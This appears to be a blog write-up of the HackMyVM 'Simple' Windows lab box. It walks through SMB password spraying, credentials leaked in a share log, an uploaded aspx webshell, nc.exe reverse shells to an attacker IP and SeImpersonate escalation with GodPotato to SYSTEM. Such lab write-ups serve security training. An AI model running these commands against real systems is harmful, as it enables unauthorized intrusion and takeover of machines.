---
title: Simple - HackMyVM Writeup
date: 2023-10-15
categories: [Writeups, HMV]
tags: [Windows, PrivEsc, File Upload]
---

![](/assets/img/Simple/simple.png)

Hello everyone! Today we're going to be solving a really fun and easy box that a friend of mine (GatoGamer) did for the platform HackMyVM. This is a Windows box, and it's great for begginers. Nothing left to say, let's begin!

## Enumeration
---
### Ports

As always we start with the `nmap`:

```bash
nmap -sCV -p80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49675 192.168.0.105 -oN targeted
```

![](/assets/img/Simple/1.png)

Looking at these results we can go and check out the web on port 80.

### Web

Taking a look at the web we can see some possible users. Let's write that down.

![](/assets/img/Simple/2.png)

### SMB

We can seve those names and try to brute force with `crackmapexec`:

```bash
cme smb 192.168.0.105 -u users -p users --no-bruteforce --continue-on-success
```

![](/assets/img/Simple/3.png)

Here we can notice that the credentials `bogo:bogo` are valid to log in into SMB. Let's check the shares as `bogo`:

```bash
cme smb 192.168.0.105 -u bogo -p bogo --shares
```

![](/assets/img/Simple/4.png)

Let's see what is inside of the share `LOGS`:

```bash
impacket-smbclient simple.hmv/bogo:bogo@192.168.0.105
```

![](/assets/img/Simple/5.png)

If we check the log we can notice a credential for `marcos`:

![](/assets/img/Simple/6.png)

Now we can again enumerate SMB, but this time the WEB share:

```bash
impacket-smbclient simple.hmv/marcos:SuperPassword@192.168.0.105
```

![](/assets/img/Simple/7.png)

Here we can see that i've alredy putted an aspx webshell called [cmd.aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx):

And we can execute commands as the service account that runs the IIS service:

![](/assets/img/Simple/8.png)

It worth to know that **all service accounts** will have the `SeImpersonatePrivilege`, so we can escalate our privileges quite easyily. I'll show two ways.

## PrivEsc
---

First of all, we'll get a shell as the IIS user:

```powershell
/c \\192.168.0.117\smbFolder\nc.exe -e cmd 192.168.0.117 443
```

![](/assets/img/Simple/9.png)

```bash
rlwrap nc -lvnp 443
```

![](/assets/img/Simple/10.png)

### JuicyPotatoNG

First, we'll download the [binary](https://github.com/antonioCoco/JuicyPotatoNG.git). Then, we'll copy it into the victim box. After that, we'll execute the following command and we'll get a reverse shell as `nt authority\system`:

```powershell
.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c \\192.168.0.117\smbFolder\nc.exe -e cmd 192.168.0.117 9001"
```

This isn't gonna work tho. You know, because of the CLSID of an actual system :|

### GodPotato

This tool work. The same procedure as JuicyPotato, just upload the [binary](https://github.com/BeichenDream/GodPotato) to the victim box and run the following command:

```powershell
.\GodPotato-NET4.exe -cmd "whoami"
```

![](/assets/img/Simple/11.png)

We can see that we are now `nt authority system`! Let's get a shell:

```powershell
.\GodPotato-NET4.exe -cmd ".\nc.exe -e cmd 192.168.0.117 9001"
```
![](/assets/img/Simple/12.png)

Now you can read the flags in:

```
C:\Users\marcos\Desktop\user.txt
C:\Users\Administrator\Desktop\root.txt
```
